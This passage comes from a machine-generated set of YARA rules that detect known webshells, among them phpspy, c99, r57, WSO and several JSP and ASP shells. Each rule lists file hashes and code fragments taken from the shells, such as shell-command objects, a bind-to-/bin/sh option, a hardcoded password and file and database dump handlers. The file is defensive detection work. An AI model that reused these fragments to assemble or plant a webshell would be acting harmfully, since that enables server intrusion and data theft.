      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "<a href='?Action=cmdx' target='FileFrame'> <font color=red> " fullword ascii
      $s2 = "net.exe net1.exe" fullword ascii
      $s3 = "\":OBT(18,0) = \"Shell.Users\":OBt(18,2) = \"" fullword ascii
      $s4 = "\":ObT(1,0) = \"wscript.shell\":ObT(1,2) = \"" fullword ascii
      $s5 = "Session(\"FolderPath\")=\"\" Then:FolderPath=WwwRoot:Session(\"FolderPath\")=FolderPath:End if" fullword ascii
      $s6 = "si=si&\"<a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DownFile\"\");' title='" fullword ascii
      $s7 = "\":ObT(4,0) = \"Scripting.Dictionary\":ObT(4,2) = \"" fullword ascii
      $s8 = "Dim ObT(18,2):Fn=Action:ObT(0,0) = \"Scripting.FileSystemObject\":ObT(0,2) = \"" fullword ascii
      $s9 = "\":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>\"\" then:Session(\"FolderPath\")=RRePath(FolderPath):End I" ascii
      $s10 = "\":ObT(10,0) = \"JMail.SmtpMail\":ObT(10,2) = \"JMail " fullword ascii
      $s11 = "\":ObT(12,0) = \"SmtpMail.SmtpMail.1\":ObT(12,2) = \"SmtpMail " fullword ascii
      $s12 = "ObT(14,0) = \"ws\"&\"cript.shell.1\":  OBt(14,2) = \"" fullword ascii
      $s13 = "'>Move</a></td><td id=d>\"&replace(L.DateLastModified,\"/\",\"-\")&\"</td></tr>\"" fullword ascii
      $s14 = "For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=\" " fullword ascii
      $s15 = "\":ObT(13,0) = \"Microsoft.XMLHTTP\":ObT(13,2) = \"" fullword ascii
      $s16 = "\":ObT(5,0) = \"Adodb.connection\":ObT(5,2) = \"" fullword ascii
      $s17 = "\":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>\"\" then:Session(\"FolderPath\")=RRePath(FolderPath):End I" ascii
      $s18 = "si=si&\" <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"DelFile\"\")'  onclick='return yesok()' class" ascii
      $s19 = "\":ObT(9,0) = \"Persits.Upload.1\":ObT(9,2) = \"ASPUpload " fullword ascii
      $s20 = "'>Del</a> <a href='javascript:FullForm(\"\"\"&RePath(Path&\"\\\"&L.Name)&\"\"\",\"\"CopyFile\"\")' class='am' title='" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _phpspy_2005_full_phpspy_2005_lite_166 {
   meta:
      description = "webshell - from files phpspy_2005_full.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash2 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
      $s2 = "if ($login) {" fullword ascii
      $s3 = "$shellmode=(!get_cfg_var(\"safe_mode\")) ? \" | <a href=\\\"?action=shell\\\">WebShell</a>\" : \"\";" fullword ascii
      $s4 = "<title>PhpSpy Ver 2005</title>" fullword ascii
      $s5 = " PhpSpy " fullword ascii
      $s6 = "$servername = isset($servername) ? $servername : 'localhost';" fullword ascii
      $s7 = "    <td width=\"375\" align=\"right\" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td>" fullword ascii
      $s8 = "$admin['pass']=\"angel\";" fullword ascii
      $s9 = "\">Version 2005</a></td>" fullword ascii
      $s10 = "elseif($uploadfile) {" fullword ascii
      $s11 = "<tr class=\"<?=getrowbg()?>\">" fullword ascii
      $s12 = "elseif($rmdir) {" fullword ascii
      $s13 = "  </table></td>" fullword ascii
      $s14 = "elseif($doeditfile) {" fullword ascii
      $s15 = "value=\"<?=$filename?>\"> " fullword ascii
      $s16 = "<table width=\"760\" border=\"0\" cellpadding=\"3\" cellspacing=\"0\" bgcolor=\"#ffffff\">" fullword ascii
      $s17 = "echo @rmdir($deldir) ? \"" fullword ascii
      $s18 = "elseif($viewphpvar) {" fullword ascii
      $s19 = "if (@unlink($delfile)) {" fullword ascii
      $s20 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlencode($filepath).\"\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99v2_ctt_sh_167 {
   meta:
      description = "webshell - from files c99v2.php, ctt_sh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash2 = "0a29cf1716e67a7932e604c5d3df4b7f372561200c007f00131eef36f9a4a6a2"
   strings:
      $s1 = "  if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $s2 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $s3 = "  else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $s4 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s5 = "  if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $s6 = "  if (!$ret) {echo \"Can't execute \\\"ps -aux\\\"!\";}" fullword ascii
      $s7 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_wwo\\\" value=\\\"1\\\" \".gchds($search_text_wwo,1,\" checked\")." ascii
      $s8 = "ch_name_regexp,1,\" checked\").\"> - regexp" fullword ascii
      $s9 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_not\\\" value=\\\"1\\\" \".gchds($search_text_not,1,\" checked\")." ascii
      $s10 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_not\\\" value=\\\"1\\\" \".gchds($search_text_not,1,\" checked\")." ascii
      $s11 = "t\\\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>\";}" fullword ascii
      $s12 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_wwo\\\" value=\\\"1\\\" \".gchds($search_text_wwo,1,\" checked\")." ascii
      $s13 = "<b>Search for (file/directory name): </b><input type=\\\"text\\\" name=\\\"search_name\\\" size=\\\"\".round(strlen($search_name" ascii
      $s14 = "<br><br><input type=\\\"checkbox\\\" name=\\\"search_text_regexp\\\" value=\\\"1\\\" \".gchds($search_text_regexp,1,\" checked\"" ascii
      $s15 = "\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s16 = "d=/var/cpanel/&ft=txt\\\"><u><b>View cpanel logs</b></u></a></font></b><br>\";}" fullword ascii
      $s17 = " echo \"<form method=\\\"POST\\\"><textarea name=\\\"eval\\\" cols=\\\"122\\\" rows=\\\"10\\\">\".htmlspecialchars($eval).\"</te" ascii
      $s18 = "nf&d=/usr/local/apache/conf/&ft=txt\\\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>\";}" fullword ascii
      $s19 = " echo \"<form method=\\\"POST\\\">" fullword ascii
      $s20 = "&nbsp;&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_text_cs\\\" value=\\\"1\\\" \".gchds($search_text_cs,1,\" checked\").\"" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _jsp_jsp_168 {
   meta:
      description = "webshell - from files jsp.jsp, jsp.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "98f64a05f651abc11845a40fd48e8858c4845031ff196bdbf8260a2cb17af59d"
      hash2 = "b281c745334f6660c888fef83ae615d0fb219d9dddc74eebf8ad0b0682791b3b"
   strings:
      $s1 = "g[] x=s.trim().split(\"\\r\\n\");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(\"select" ascii
      $s2 = "ws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q" ascii
      $s3 = "1; i <=n; i++){sb.append(d.getColumnName(i)+\"\\t|\\t\");}sb.append(\"\\r\\n\");if(q.indexOf(\"--f:\")!=-1){File file=new File(p" ascii
      $s4 = "FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInput" ascii
      $s5 = ".indexOf(\"--f:\")!=-1?q.substring(0,q.indexOf(\"--f:\")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(in" ascii
      $s6 = "a.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;" ascii
      $s7 = " k=0; k < x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exce" ascii
      $s8 = "Stream(new FileInputStream(s));os.write((\"->\"+\"|\").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write" ascii
      $s9 = " s)throws Exception{return new String(s.getBytes(\"ISO-8859-1\"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim(" ascii
      $s10 = "T,sQ,sF=\"\";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");for(int i=0; i<l.length; i++){d" ascii
      $s11 = "x[4],x[2].equalsIgnoreCase(\"[/null]\")?\"\":x[2],x[3].equalsIgnoreCase(\"[/null]\")?\"\":x[3]);}else{Connection c=DriverManager" ascii
      $s12 = "split(\"\\r\\n\");Class.forName(x[0].trim());if(x[1].indexOf(\"jdbc:oracle\")!=-1){return DriverManager.getConnection(x[1].trim(" ascii
      $s13 = "exOf(\"-to:\")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf(\"-to:\")" ascii
      $s14 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!String Pwd=\"023\";String cs=\"UTF-8\";String EC(" ascii
      $s15 = "f(\"jdbc:oracle\")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+\"\\t" ascii
      $s16 = "?p.trim():p+q.substring(q.indexOf(\"--f:\")+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i<=n;i++){if(q.indexO" ascii
      $s17 = "+d.getColumnTypeName(i)+\")\\t\");}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)t" ascii
      $s18 = "()){sb.append(l[i].getName()+\"/\\t\"+sT+\"\\t\"+l[i].length()+\"\\t\"+sQ+\"\\n\");}else{sF+=l[i].getName()+\"\\t\"+sT+\"\\t\"+l" ascii
      $s19 = "rAt(i)) << 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new Fil" ascii
      $s20 = "om \"+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i<=d.getColumnCount();i++){sb.append(d.getColumnName(i)+\" " ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99shell_Shell__ci___Biz_was_here_c99_169 {
   meta:
      description = "webshell - from files c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash2 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash3 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = " else {echo \"<form action=\\\"\".$surl.\"\\\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug " ascii
      $s2 = " array(\"<b>Proc.</b>\",$surl.\"act=processes&d=%d\")," fullword ascii
      $s3 = "  if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s4 = "  else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$surl" ascii
      $s5 = " $data = @file_get_contents($url);" fullword ascii
      $s6 = "   else {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"d\\\"><img src=\\\"\".$sur" ascii
      $s7 = "   if ($parsesort[1] != \"a\") {$y = \"<a href=\\\"\".$surl.\"act=\".$dspact.\"&d=\".urlencode($d).\"&processes_sort=\".$k.\"a" ascii
      $s8 = "    $source = file_get_contents($sourceurl);" fullword ascii
      $s9 = "  if ($data{0} == \"\\x99\" and $data{1} == \"\\x02\") {return \"You are using latest version!\";}" fullword ascii
      $s10 = "  else {return \"Error in protocol: segmentation failed! (\".$data.\") \";}" fullword ascii
      $s11 = " array(\"<b>Update</b>\",$surl.\"act=update&d=%d\")," fullword ascii
      $s12 = " array(\"<b>Tools</b>\",$surl.\"act=tools&d=%d\")," fullword ascii
      $s13 = "    else {$row[] = \"<a href=\\\"\".$surl.\"act=f&f=\".$uo.\"&ft=info&d=\".$ud.\"\\\"><img src=\\\"\".$surl.\"act=img&img=ext_di" ascii
      $s14 = "rt_asc\\\" height=\\\"9\\\" width=\\\"14\\\" border=\\\"0\\\"></a>\";}" fullword ascii
      $s15 = "ort_asc\\\" height=\\\"9\\\" width=\\\"14\\\" border=\\\"0\\\"></a>\";}" fullword ascii
      $s16 = ".$surl.\"act=img&img=sort_desc\\\" height=\\\"9\\\" width=\\\"14\\\" border=\\\"0\\\"></a>\";}" fullword ascii
      $s17 = "$checkbox;}" fullword ascii
      $s18 = "  $data = ltrim($data);" fullword ascii
      $s19 = "  if ($data{0} == \"\\x99\" and $data{1} == \"\\x03\")" fullword ascii
      $s20 = "t[1] == \"a\"?\"Asc.\":\"Desc\").\"\\\" border=\\\"0\\\"></a>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _code_dev_core_170 {
   meta:
      description = "webshell - from files code.php, dev_core.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "95884ff3ada861e259442eb0c8920ff8bdb25064c237b292036fa1f65fdfac00"
      hash2 = "ce82bff4cbfe2832136ea50bf57029896e1a3f22f51dfc808fb017210e6b9ebc"
   strings:
      $s1 = "$(\"login\").style.display = \"block\"" fullword ascii
      $s2 = "request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');" fullword ascii
      $s3 = "<meta http-equiv=\"content-type\" content=\"text/html\" />" fullword ascii
      $s4 = "options.method = 'POST';" fullword ascii
      $s5 = "       Password: " fullword ascii
      $s6 = "req.open(options.method, options.url, true);" fullword ascii
      $s7 = "req.onreadystatechange = function() {" fullword ascii
      $s8 = "   <div id=\"login\">" fullword ascii
      $s9 = "if (req.readyState == 4 && req.status == 200) {" fullword ascii
      $s10 = "document.onkeydown = function(e) {" fullword ascii
      $s11 = "options.url = '{self}';" fullword ascii
      $s12 = "return document.getElementById(d)" fullword ascii
      $s13 = "var json = eval(\"(\" + this.responseText + \")\");" fullword ascii
      $s14 = "var req = new window.ActiveXObject('Microsoft.XMLHTTP')" fullword ascii
      $s15 = "window.setTimeout(display, t);" fullword ascii
      $s16 = "var req = new XMLHttpRequest()" fullword ascii
      $s17 = "options.listener = callback;" fullword ascii
      $s18 = "options.listener.call(req)" fullword ascii
      $s19 = "return req" fullword ascii
      $s20 = "function XmlRequest(options) {" fullword ascii
   condition:
      ( uint16(0) == 0x2f2f and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _Browser_download_ma_devshell_jsp_File_browser_3_171 {
   meta:
      description = "webshell - from files Browser.jsp, download.jsp, ma.jsp, devshell.jsp, jsp_File_browser.jsp, 3.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
      hash2 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
      hash3 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
      hash4 = "0e7176e1e40aa5f059ba14236f42d79af672ab1a097aa8a3a07092b055fb5571"
      hash5 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
      hash6 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
   strings:
      $s1 = "//Process is running" fullword ascii
      $s2 = "//if the process has not finished, an exception is thrown" fullword ascii
      $s3 = "//private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s4 = "ret.append(\"Error: \" + e);" fullword ascii
      $s5 = "//Get input and error streams" fullword ascii
      $s6 = "BufferedInputStream ls_err = new BufferedInputStream(ls_proc.getErrorStream());" fullword ascii
      $s7 = "Thread.sleep(50);" fullword ascii
      $s8 = "&& (request.getContentType().toLowerCase().startsWith(\"multipart\"))) {" fullword ascii
      $s9 = "public int compare(Object o1, Object o2) {" fullword ascii
      $s10 = "BufferedInputStream ls_in = new BufferedInputStream(ls_proc.getInputStream());" fullword ascii
      $s11 = "response.setContentType(\"application/octet-stream\");" fullword ascii
      $s12 = "String[] comm = new String[3];" fullword ascii
      $s13 = "while ((ls_in.available() > 0) && (++c <= 1000)) {" fullword ascii
      $s14 = "while ((i = text.read()) >= 0) {" fullword ascii
      $s15 = "long start = System.currentTimeMillis();" fullword ascii
      $s16 = "outs.write(lineend);" fullword ascii
      $s17 = "while ((ls_err.available() > 0) && (++c <= 1000)) {" fullword ascii
      $s18 = "outs.write(i);" fullword ascii
      $s19 = "String lineend = \"\\n\";" fullword ascii
      $s20 = "else if (cr) {" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57_172 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "if(isset($_GET['users'])) " fullword ascii
      $s2 = " $_POST['cmd']=\"\";  " fullword ascii
      $s3 = "  return $users; " fullword ascii
      $s4 = "    $_POST['cmd']=\"\";                   " fullword ascii
      $s5 = "    header(\"Content-disposition: attachment; filename=\\\"\".$filename.\"\\\";\");   " fullword ascii
      $s6 = "     else if ($compress == 'zip' && @function_exists('gzcompress')) " fullword ascii
      $s7 = "     else if ($compress == 'gzip' && @function_exists('gzencode')) " fullword ascii
      $s8 = "    if ($compress == 'bzip' && @function_exists('bzcompress')) " fullword ascii
      $s9 = " if(empty($os)){ $os =\"-\"; $unix=1; } " fullword ascii
      $s10 = "            pack('v', sizeof($this -> ctrl_dir)) .  " fullword ascii
      $s11 = "  die(); " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso2_5_1_other_decode_wso2_wso_ng_173 {
   meta:
      description = "webshell - from files wso2.5.1.php, other-decode.php, wso2.php, wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash2 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash3 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash4 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $s1 = "wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s2 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcslashes" ascii
      $s3 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcslashes" ascii
      $s4 = "function wsoLogin() {" fullword ascii
      $s5 = "<span>Bind port to /bin/sh [perl]</span><br/>" fullword ascii
      $s6 = "wsoSecParam('Supported databases', implode(', ', $temp));" fullword ascii
      $s7 = "WSOsetcookie('f', serialize(@$_POST['f']));" fullword ascii
      $s8 = "WSOsetcookie('act', $_POST['p1']);" fullword ascii
      $s9 = "WSOsetcookie('c', @$_POST['c']);" fullword ascii
      $s10 = "wsoHeader();" fullword ascii
      $s11 = "function wsoHeader() {" fullword ascii
      $s12 = "wsoSecParam('Open base dir', @ini_get('open_basedir'));" fullword ascii
      $s13 = "tmlspecialchars(ob_get_clean()), \"\\n\\r\\t\\\\'\\0\") . \"';\\n\";" fullword ascii
      $s14 = "<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>" fullword ascii
      $s15 = "$_POST['charset'] = $GLOBALS['default_charset'];" fullword ascii
      $s16 = "wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));" fullword ascii
      $s17 = "wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));" fullword ascii
      $s18 = "Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>" fullword ascii
      $s19 = "<form name='nfp' onSubmit=\\\"g(null,null,'bcp',this.server.value,this.port.value);return false;\\\">" fullword ascii
      $s20 = "<form name='nfp' onSubmit=\\\"g(null,null,'bpp',this.port.value);return false;\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _asp_4_0_2013110125027897_asp__1___2014_10_23_14_54_16__2014_2014_4_0__174 {
   meta:
      description = "webshell - from files asp.asp, 4.0.asp, 2013110125027897.asp, asp (1)__2014-10-23-14-54-16.asp, _2014.asp, 2014.asp, 4.0 (1).asp, asp (1).asp, .asp, 2013.asp, _2012.asp, .asp, vps.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
      hash2 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash3 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash4 = "c4a1256a20bd05705365d4f53e7e968c7270ad54d429826d46307dd0bf47b0be"
      hash5 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash6 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash7 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash8 = "fe68b71a08164d265887dc54dc95efde789d70eb77b318ca289a3b5998c90aca"
      hash9 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash10 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash11 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash12 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash13 = "a5728d9bfa3233f4c79b0551dc79dff0182392beadbb4cdfc823d4a8c68187f9"
      hash14 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash15 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "TempFolderList = Array(\"windows\",\"winnt\",\"win\",\"win2000\",\"win98\",\"web\",\"winme\",\"windows2000\",\"asp\",\"php\",\"T" ascii
      $s2 = "Set TempFolder = Nothing" fullword ascii
      $s3 = "Set TempFolders = Nothing" fullword ascii
      $s4 = "Dim FSO,OFolder,TempFolder,Scmsg,S" fullword ascii
      $s5 = "For Each D in TempFolders" fullword ascii
      $s6 = "For Each S in TempFolders" fullword ascii
      $s7 = "\",Temp_Str,1" fullword ascii
      $s8 = "Set TempFolders = OFolder.SubFolders" fullword ascii
      $s9 = "Temp_Str = Temp_Str & \"<LI>\" & Red(\"" fullword ascii
      $s10 = "If t=0 then Temp_Str = Temp_Str & \"<LI>" fullword ascii
      $s11 = "For i = 0 to Ubound(TempFolderList)" fullword ascii
      $s12 = "Temp_Str = Temp_Str & \"<LI>" fullword ascii
      $s13 = "\" & ScReWr(Drive & \":\\\" & TempFolderList(i))" fullword ascii
      $s14 = "Set TempFolders = BaseFolder.SubFolders" fullword ascii
      $s15 = "Function suftp()" fullword ascii
      $s16 = "Set TestDrive = FSO.GetDrive(Drive)" fullword ascii
      $s17 = "If TestDrive.IsReady Then" fullword ascii
      $s18 = "Set BaseFolder = TestDrive.RootFolder" fullword ascii
      $s19 = "\" & Red(TestDrive.ShareName) & \"<LI>" fullword ascii
      $s20 = "\" & Red(TestDrive.FileSystem) & \"<LI>" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso2_5_1_other_decode_wso_4_2_3_wso_4_2_1_wso2_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_ng_175 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso2.5.1.php, other-decode.php, wso-4.2.3.php, wso-4.2.1.php, wso2.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso-ng.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "e755ab961e03c18481ac884ddbc8cd665ddf36ccf106b4a82d89079fe18dbca5"
      hash3 = "5a3a5b2f5c081b894e410381415a7f2c821a55d7781b82c0d819cfe56ad1a9a8"
      hash4 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash5 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash6 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
      hash7 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash8 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash9 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash10 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash11 = "7dd2dad4b336d3d76a3a9f43aba0a119dc13a95fd1572c5c92d4996916848fb8"
   strings:
      $s1 = "function dump($table, $fp = false) {" fullword ascii
      $s2 = "header(\"Content-Type: \" . $type);" fullword ascii
      $s3 = "return $this->res = $this->query(\"SELECT datname FROM pg_database WHERE datistemplate!='t'\");" fullword ascii
      $s4 = "echo 'Saved!<br><script>p3_=\"\";</script>';" fullword ascii
      $s5 = "$gid['name'] = @filegroup($_POST['p1']);" fullword ascii
      $s6 = "$db->query(@$_POST['p2']);" fullword ascii
      $s7 = "$uid['name'] = @fileowner($_POST['p1']);" fullword ascii
      $s8 = "$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);" fullword ascii
      $s9 = "} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));" fullword ascii
      $s10 = "$file = $db->loadFile($_POST['p2']);" fullword ascii
      $s11 = "$time = @filemtime($_POST['p1']);" fullword ascii
      $s12 = "return @pg_last_error();" fullword ascii
      $s13 = "return @mysql_error();" fullword ascii
      $s14 = "unset($_COOKIE['f']);" fullword ascii
      $s15 = "D table_schema != 'pg_catalog'\");" fullword ascii
      $s16 = "return $this->res = $this->query(\"select table_name from information_schema.tables where table_schema != 'information_schema' A" ascii
      $s17 = "echo '<span>' . $n . ': </span>';" fullword ascii
      $s18 = "} else echo 'Bad time format!';" fullword ascii
      $s19 = "d.sf.p2.value = t;" fullword ascii
      $s20 = "var params = 'ajax=true';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

